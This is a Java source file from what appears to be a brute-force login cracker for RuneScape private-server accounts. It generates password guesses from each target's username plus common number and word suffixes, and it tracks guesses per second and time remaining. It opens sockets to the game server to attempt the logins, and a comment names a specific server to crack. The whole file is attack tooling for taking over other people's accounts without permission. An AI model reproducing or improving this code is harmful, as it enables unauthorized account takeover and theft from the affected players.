package aniski.rs.player;

import aniski.rs.Store;
import aniski.rs.net.RSSocket;
import aniski.rs.utils.ThreadFactory;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class Player {

    private final String username;
    private String lastPassword;
    private boolean loggedIn;
    private boolean failedLogin;

    private int currentTime;
    private int checksPerSecond;
    private String remainingTime;

    private final ArrayList<RSSocket> rsSockets = new ArrayList<>();

    private final ArrayList<ThreadFactory> threads = new ArrayList<>();

    private ArrayList<String> passwords;

    private final String[] commonStuffArray = new String[]{
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
            "01", "10", "11", "13", "47", "69", "99",
            "101", "111", "117", "222", "333", "343", "420", "444", "456", "555", "666", "777", "789", "888", "999",
            "0000", "1111", "1234", "1337", "4321", "5678", "6969", "7777", "6789", "9000", "9999",
            "12345",
            "111111", "123123", "123456",
            "1234567",
            "123123123",
            "123456789",
            "1234567890",
            "k", "xd", "kk", "ok", "btw", "wtf", "lol", "qwerty","qwertyuiop"};

    public Player(String username, ArrayList<String> passwords) {
        this.username = username;
        this.passwords = passwords;
    }

    public String getPasswordInOrder(int threadId) {
        if(getPasswords() != null && getPasswords().size() > 0) {
            return getPasswords().remove(threadId);
        } else {
            setFailedLogin(true);
            System.out.println("(!!) FAILED TO READ PASSWORD FROM MEMORY - SKIPPING USER (POSSIBLY NULL OR OUT OF PASSWORDS)");
            try {
                Thread.sleep(2000);
            } catch (InterruptedException ignored) {
                System.out.println("Error sleeping thread.");
                //e.printStackTrace();
            }
            emptyPasswords();
        }
        return null;
    }

    public void checksPerSecond(int startupDelay) {

        currentTime -= startupDelay;
        remainingTime = "00:00:00";

        ThreadFactory thread = new ThreadFactory();
        threads.add(thread);//Adds the CPS to the player's threads

        Executors.newSingleThreadScheduledExecutor(thread).scheduleAtFixedRate(() -> {
            int totalPasswords = Store.getTotalPasswordsLoaded();
            int remainingPasswords = getPasswords().size();
            int totalLoggedInWithPassword = totalPasswords - remainingPasswords;

            boolean hasFinished = (remainingPasswords <= 0 || (isFailedLogin() || isLoggedIn()));

            currentTime++;

            if (totalLoggedInWithPassword <= 0)
                return;

            checksPerSecond = (totalLoggedInWithPassword / currentTime);

            int remainingAmount = (remainingPasswords / checksPerSecond);

            remainingTime = String.format("%d:%02d:%02d", remainingAmount / 3600, (remainingAmount % 3600) / 60, (remainingAmount % 60));

          //  System.out.println("CHECKS PER SECOND THREAD: "+checksPerSecond+", "+totalPasswords+",  "+totalLoggedInWithPassword+", "+remainingPasswords+"," +hasFinished);

            if(hasFinished)
                thread.stopThreads();

        }, 0, 1, TimeUnit.SECONDS);
    }

    public void sendPasswordUpdateThread() {
     /*   int totalPasswords = getStore().getTotalPasswordsLoaded();
        ThreadFactory thread = new ThreadFactory();
        Executors.newSingleThreadScheduledExecutor(thread).scheduleAtFixedRate(() -> {
            int remainingPasswords = player.getPasswords().size();
            boolean hasFinished = (remainingPasswords <= 0 || (player.isLoggedIn() || player.isFailedLogin()));

            float percentage = (float) (((totalPasswords - remainingPasswords) * 100) / totalPasswords);

            //if (getStore().getLastAttemptedUsername() != null && player.getLastPassword() != null)
            //    sendPasswordInterface(getStore().getLastAttemptedUsername(), player.getLastPassword(), (int) percentage, hasFinished);

            if(hasFinished)
                thread.stopThreads();
        }, 0, 69, TimeUnit.MILLISECONDS);*/

    }

    public void addNameRelatedPasswords() {
        String username = getUsername();
        username = username.replaceAll(" ", "");
        username = username.replaceAll("_", "");

        int lines = 2;
        for(int i = 0; i < 1000; i++) {
            getPasswords().add(i + username + i);
            getPasswords().add(i + username);
            getPasswords().add(i + username.toUpperCase() + i);
            getPasswords().add(i + username.toUpperCase());
            getPasswords().add(username.toUpperCase() + i);
            lines += 5;
           // if (!Store.getRspsToCrack().equals("envision")) {
           //     getPasswords().add(0, username + i + "!");
            //    lines += 1;
            //}
        }
        for(int i = 0; i < 10000; i++) {
            getPasswords().add( username + i);
            lines += 1;
        }

          /*  for(int i = 0; i < 999999; i++) {
                getPasswords().add(String.valueOf(i));
                lines += 1;
            }*/
        //Common Passwords to push to the top of the list
  /*      getPasswords().add(0, username.toUpperCase());
        getPasswords().add(0, username.toLowerCase());
        getPasswords().add(0, StringUtils.capitalize(username.toLowerCase()));*/

        String[] usernamePatterns = new String[]{
                username.toLowerCase(), username.toUpperCase(),
                (
                        username.toLowerCase().substring(0, 1).toUpperCase() + username.substring(1)
                )
        };

        for(String usernamePattern : usernamePatterns) {
            getPasswords().add(0, usernamePattern); //Basic Name
            getPasswords().add(0, "1" + usernamePattern + "1"); //Number Pattern (Common)
            for(String commonStuff : commonStuffArray) { //You know what this is
                getPasswords().add(0, usernamePattern + commonStuff);
                lines ++;
            }
        }
        //Always the first password so I know if the user doesn't exist
        getPasswords().add(0, "NEWUSER");

        System.out.println("[NAME RELATED PASSWORDS] Successfully loaded "+lines+" passwords.");
    }

    public void emptyPasswords() {
        setPasswords(new ArrayList<>());
    }

    public String getUsername() {
        return username;
    }

    public ArrayList<String> getPasswords() {
        return passwords;
    }

    public void setPasswords(ArrayList<String> passwords) {
        this.passwords = passwords;
    }

    public void setFailedLogin(boolean failedLogin) {
        this.failedLogin = failedLogin;
    }

    public void setLoggedIn(boolean loggedIn) {
        this.loggedIn = loggedIn;
    }

    public void setLastPassword(String lastPassword) {
        this.lastPassword = lastPassword;
    }

    public boolean isLoggedIn() {
        return loggedIn;
    }

    public boolean isFailedLogin() {
        return failedLogin;
    }

    public int getChecksPerSecond() {
        return checksPerSecond;
    }

    public String getRemainingTime() {
        return remainingTime;
    }

    public void addThread(ThreadFactory thread) {
        this.threads.add(thread);
    }

    public void addRSSocket(String serverAddress, int port) {
        Socket socket = null;
        try {
            socket = new Socket(InetAddress.getByName(serverAddress),port);
        } catch (IOException e) {
            System.out.println("Error opening socket");
           // e.printStackTrace();
        }
        if(socket != null) {
            RSSocket rsSocket = new RSSocket(socket);
            this.rsSockets.add(rsSocket);
        }
    }

    public ArrayList<RSSocket> getRsSockets() {
        return rsSockets;
    }

    public ArrayList<ThreadFactory> getThreads() {
        return threads;
    }
}
